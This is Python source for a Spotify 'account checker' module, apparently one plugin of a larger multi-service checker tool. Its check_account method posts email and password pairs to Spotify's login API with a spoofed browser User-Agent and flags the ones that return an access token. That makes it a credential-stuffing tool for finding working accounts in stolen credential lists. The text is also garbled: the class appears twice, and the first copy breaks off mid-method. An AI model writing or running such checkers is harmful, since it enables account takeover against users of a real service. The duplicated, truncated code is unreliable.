import aiohttp
from ..base import BaseChecker

class SpotifyAccountChecker(BaseChecker):
    def __init__(self):
        super().__init__(timeout=30)
        self.name = "Spotify"

    async def check_account(self, email: str, password: str) -> bool:
        try:
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
                data = {"username": email, "password": password, "remember": True}
                async with session.post("https://accounts.spotify.com/api/login", data=data, headers=headers) as resp:
                    text = await resp.text()
                    return resp.status == 200 and "accessToken" in text
        except:
            return False

    async def check_cookie(self, cookie: str) -> bool:
        return False

    def extract_cookies_from_text(self, text: str) -> list:
import aiohttp
from ..base import BaseChecker

class SpotifyAccountChecker(BaseChecker):
    def __init__(self):
        super().__init__(timeout=30)
        self.name = "Spotify"

    async def check_account(self, email: str, password: str) -> bool:
        try:
            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = {"username": email, "password": password, "remember": True}
                async with session.post(
                    "https://accounts.spotify.com/api/login",
                    data=data,
                    headers=headers
                ) as resp:
                    text = await resp.text()
                    return resp.status == 200 and "accessToken" in text
        except:
            return False

    async def check_cookie(self, cookie: str) -> bool:
        return False

    def extract_cookies_from_text(self, text: str) -> list:
        return []
